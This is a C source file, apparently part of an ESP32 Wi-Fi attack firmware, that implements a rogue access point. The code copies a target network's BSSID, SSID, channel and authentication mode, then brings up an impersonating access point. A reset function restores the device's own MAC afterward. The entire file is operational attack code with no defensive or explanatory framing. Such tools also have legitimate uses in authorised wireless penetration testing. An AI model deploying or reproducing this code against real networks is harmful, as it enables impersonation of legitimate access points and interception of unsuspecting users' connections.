#include "rogueap.h"

#include "string.h"
#include "esp_log.h"
#include "esp_wifi_types.h"
#include "wifi_controller.h"

static const char *TAG = "wifi_attack/rogueap";

void rogueap_request(const wifi_ap_record_t *ap_record) {
    ESP_LOGD(TAG, "Configuring Rogue AP");
    wifi_set_ap_mac(ap_record->bssid);
    wifi_config_t ap_config = {
            .ap = {
                    .ssid_len = strlen((char *) ap_record->ssid),
                    .channel = ap_record->primary,
                    .authmode = ap_record->authmode,
                    .password = "dummypassword",
                    .max_connection = 1
            },
    };
    mempcpy(ap_config.ap.ssid, ap_record->ssid, 32);
    wifi_access_point(&ap_config);
}

void rogueap_reset() {
    wifi_restore_ap_mac();
    wifi_access_point_stop();
}
